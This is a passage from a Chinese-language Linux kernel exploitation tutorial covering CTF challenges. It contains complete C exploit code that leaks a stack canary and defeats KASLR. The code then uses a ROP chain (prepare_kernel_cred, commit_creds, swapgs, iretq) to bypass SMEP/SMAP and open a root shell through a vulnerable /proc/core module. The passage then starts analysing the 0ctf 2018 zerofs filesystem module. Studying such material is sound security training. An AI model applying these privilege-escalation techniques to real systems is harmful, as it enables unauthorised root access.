        write(fd1,poc,0x100);
        ioctl(fd1,0x6677889A,0xf000000000000058);
        system("/bin/sh");
        return 0;
    }
成功执行后如下：
这样做的好处是不需要特地去找gadgets，但是这样做的前提是内核没有开启`smep`、`smap`等防护措施，在开启这些防护措施后，内核层是无法直接执行用户层代码的。如果开启了`smep`、`smap`则会产生如下错误：
因此还有更加通用的做法，就是通过构造一条完整的rop链来实现提权并返回到用户层。区别于当前的操作就是在整个执行过程中是不会跳转回用户层的代码的，所有提权函数的调用均通过栈上的数据控制，在执行提权函数后通过`iret`指令返回用户层空间。
### **方法2**
为了绕过`smep`、`smap`等防护措施，需要构造完整的rop链，需要查找内核映像中可用的gadgets，这里使用`ropper`来dump整个内核可用的gadgets。需要注意的是链接中给出的vmlinux和实际的bzImage的地址并不匹配，因此需要通过extract-vmlinunx脚本来将bzImage中的内核可执行文件dump出来，用法如下：
    extract-vmlinux ./bzImage > vmlinux
接下来通过ropper提取vmlinux中可用的gadgets，用法如下：
    ropper --file ./vmlinx --nocolor > gadgets
寻找`pop rdi,ret`，`mov rdi, rax`，`iret`，`swapgs`等指令，如下：
    .text:FFFFFFFF81126515                 pop     rdi
    .text:FFFFFFFF81126516                 retn
    .text:FFFFFFFF8186EB33                 pop     rcx
    .text:FFFFFFFF8186EB34                 retn
    .text:FFFFFFFF81623D0B                 mov     rdi, rax
    .text:FFFFFFFF81623D0E                 call    rcx
    .text:FFFFFFFF810A0F49                 pop     rdx
    .text:FFFFFFFF810A0F4A                 retn
    .text:FFFFFFFF81A012DA                 swapgs
    .text:FFFFFFFF81A012DD                 popfq
    .text:FFFFFFFF81A012DE                 retn
    .text:FFFFFFFF81050AC2                 iretq
需要构造的rop链为
    执行prepare_kernel_cred(0)
    将prepare_kernel_cred的执行结果赋值给rdi
    执行commit_creds
    执行swapgs
    执行iret
完整exp如下：
    #include 
    #include 
    #include 
    #include 
    typedef unsigned long long u64;
    u64 prepare_kernel_cred;
    u64 commit_creds;
    u64 ret_addr;
    u64 user_cs,user_rflags,user_ss,user_sp;
    u64 readkerneladdr(char* command)
    {
        FILE *fp; 
        u64 kaddr;
      char buffer[80];
        char* retbuf;
      fp=popen(command, "r"); 
      fgets(buffer,sizeof(buffer),fp); 
        retbuf = strstr(buffer," ");
        int addrlen = retbuf-buffer;
        memset(buffer+addrlen,0,10);
      kaddr = strtoul(buffer,NULL,16);
        return kaddr;
    }
    void execshell()
    {
        system("/bin/sh");
    }
    void save_status()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
    }
    int main(int argc,char* argv[])
    {
        int fd1 = open("/proc/core",O_RDWR);
        prepare_kernel_cred = readkerneladdr("cat /tmp/kallsyms|grep prepare_kernel_cred");
        commit_creds = readkerneladdr("cat /tmp/kallsyms|grep commit_creds");
        u64 buf[0x1000];
        memset(buf,'a',0x200);
        int off=64;
        if(argc>1)
        {
            off=strtol(argv[1],NULL,10);
        }
        printf("fd is %d\n",fd1);
        ioctl(fd1,0x6677889C,off);
        ioctl(fd1,0x6677889B,buf);
        u64 canary = buf[0];
        ret_addr = buf[2];
        u64 kernelbase = prepare_kernel_cred-0x9cce0;
        u64 kerneloff =0xFFFFFFFF81000000- kernelbase;
        save_status();
        u64 Rop[0x100]={0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,canary,0,\
            0xFFFFFFFF81126515-kerneloff,\    //pop rdi,ret
            0,\
            prepare_kernel_cred,\
            0xFFFFFFFF8186EB33-kerneloff,\    //pop rcx,ret
            0xFFFFFFFF810A0F49-kerneloff,\    //pop rdx,ret
            0xFFFFFFFF81623D0B-kerneloff,\    //mov rdi,rax,call rcx
            commit_creds,\
            0xffffffff81a012da-kerneloff,\    //swapgs,popfq,ret
            0,\
            0xFFFFFFFF81050AC2-kerneloff,\    //iret
            &execshell,\            //ret ip
            user_cs,\
            user_rflags,\
            user_sp,\
            user_ss
        };
        write(fd1,Rop,0x100);
        ioctl(fd1,0x6677889a,0xf0000000000000e0);
        return 0;
    }
修改`start.sh`如下:
    qemu-system-x86_64 \
    -m 512M \
    -kernel ./bzImage \
    -initrd  ./core.cpio \
    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
    -s  \
    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
    -nographic  \
    -cpu qemu64,+smep,+smap\
执行poc后效果如下：
## **2018 0ctf-zerofs**
题目连接：
解包得到如下内容：
    admins@admins-virtual-machine:~/kernel/exercise/zerofs/public$ ls -alh
    total 11M
    drwxrwxr-x 2 admins admins 4.0K 12月 22 17:21 .
    drwxrwxr-x 5 admins admins 4.0K 12月 22 17:22 ..
    -rw-r--r-- 1 admins admins 6.9M 3月  29  2018 bzImage
    -rw-rw-r-- 1 admins admins 3.1M 3月  30  2018 rootfs.cpio
    -rwxrwxr-x 1 admins admins  241 12月 22 17:21 run.sh
    -rw-r--r-- 1 admins admins 320K 3月  29  2018 zerofs.ko
run.sh脚本如下：
    qemu-system-x86_64 -enable-kvm -s -cpu kvm64,+smep,+smap -m 512M -kernel ./bzImage -initrd ./rootfs.cpio -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" -monitor /dev/null -nographic 2>/dev/null
开启了smep、smap以及kaslr，解包rootfs.cpio，init文件如下：
    #!/bin/sh
    mknod -m 0666 /dev/null c 1 3
    mknod -m 0660 /dev/ttyS0 c 4 64
    mount -t proc proc /proc
    mount -t sysfs sysfs /sys
    cat /root/signature
    echo 2 > /proc/sys/kernel/kptr_restrict
    echo 1 > /proc/sys/kernel/dmesg_restrict
    insmod /zerofs.ko
    setsid cttyhack setuidgid 1000 sh
    umount /proc
    umount /sys
    poweroff -f
开启kptr_restrict以及dmesg_restrict，无法查看内核函数地址，
存在问题的内核模块为zerofs.ko，开启安全策略如下：
这是个内核文件系统模块，题目提示通过mount挂载文件，查看其主要逻辑，
    undefined8 main(void)
    {
      undefined8 local_10;
      setresuid(0,0,0);
      local_4c = fork();
      if (local_4c == 0) {
        local_48 = "mount";
        local_40 = "-o";
        local_38 = "loop";
        local_30 = "-t";
        local_28 = "zerofs";
        local_20 = "/tmp/zerofs.img";
        local_18 = "/mnt";
        local_10 = 0;
        execvp("/bin/mount",&local_48);
      }
      waitpid(local_4c,&local_50,0);
      local_4c = fork();
      if (local_4c == 0) {
        local_48 = "chown";
        local_40 = "-R";
        local_38 = "1000.1000";
        local_30 = "/mnt";
        local_28 = (char *)0x0;
        execvp("/bin/chown",&local_48);
      }
      waitpid(local_4c,&local_50,0);
      local_4c = fork();
      if (local_4c == 0) {
        local_48 = "chmod";
        local_40 = "-R";
        local_38 = "a+rwx";
        local_30 = "/mnt";
        local_28 = (char *)0x0;
        execvp("/bin/chmod",&local_48);
      }
      waitpid(local_4c,&local_50,0);
      return 0;
    }
先是提升权限，然后调用了`/bin/mount` 并配有参数`-o loop -t zerofs /tmp/zerofs.img
/mnt`，可以看出主要通过mount将tmp目录下的文件zerofs.img挂载到/mnt目录，后续对挂载文件的读写会触发zerofs.ko中的回调函数。
## **linux文件系统基本概念**
为了对文件系统进行统一管理，linux将文件系统分为两层虚拟文件系统、具体文件系统：
具体文件系统依照vfs定义好的数据结构将读写文件相关的操作进行导出，由vfs进行统一管理，方便由用户层通过统一的接口即`open`、`read`、`write`等函数对文件进行操作，对用户来说，具体文件系统是透明的，能感知到的是虚拟文件系统。传统文件系统在磁盘中的布局一般如下:
一些基本概念如下：
  1. 超级块（磁盘中的超级块）用来存储文件系统的详细信息，比如块个数、块大小、空闲块等等 
  2. inode（索引节点区）用来存储索引节点 ,每个inode都有一个号码，操作系统用inode号码来识别不同的文件 
  3. dentry (目录项) 保存了文件名和inode的映射,便于加速查找文件 
  4. 数据块区 用来存储文件或目录数据 
接下来看下zerofs内核模块的实现,查看`zerofs.ko`模块，初始化代码如下：
    int zerofs_init(void)
    {
      int iVar1;
      __fentry__();
      zerofs_inode_cachep = (kmem_cache *)kmem_cache_create("zerofs_inode_cache",0x20,0,0x120000,0);
      if (zerofs_inode_cachep != (kmem_cache *)0x0) {
        iVar1 = register_filesystem(&zerofs_type); //注册文件系统
        return iVar1;
      }
      return -0xc;
    }
这里向通过`register_filesystem`函数像内核注册了一个文件系统，当然仅仅注册是无法访问该文件系统的，需要通过`mount`将对应的文件系统安装到设备上才能进行访问。
查看`register_filesystem`源码可知，该函数主要功能是将注册的文件系统添加到全局变量`file_systems`链表中。其中`zerofs_type`是`file_system_type`类型的结构体，如下：
    struct file_system_type {
      const char *name;
      int fs_flags;
      struct dentry *(*mount) (struct file_system_type *, int,
               const char *, void *);
      void (*kill_sb) (struct super_block *);
      struct module *owner;
      struct file_system_type * next;
      ...}
其中第三个参数就是它挂载时会调用的回调函数，在用户层挂载特定类型的文件系统时最终都会转发到对应内核模块的`mount`函数，查看`mount`函数如下：
    dentry * zerofs_mount(file_system_type *fs_type,int flags,char *dev_name,void *data)
    {
      dentry *extraout_RAX;
      undefined extraout_DL;
      undefined uVar1;
      uVar1 = SUB81(fs_type,0);
      __fentry__(uVar1,flags,(char)dev_name);
      mount_bdev(uVar1,(char)flags,extraout_DL,zerofs_fill_super);
      return extraout_RAX;
    }
调用了`mount_bdev`函数，查看源码可知，该函数主要通过传入的dev_name获取对应的块设备，接着从块设备中获取对应的超级块（super_block）,如果根节点为空，说明没有初始化，则调用第五个参数作为函数来初始化超级块。
    if (s->s_root) {
        if ((flags ^ s->s_flags) & SB_RDONLY) {
          deactivate_locked_super(s);
          error = -EBUSY;
          goto error_bdev;
        }
        up_write(&s->s_umount);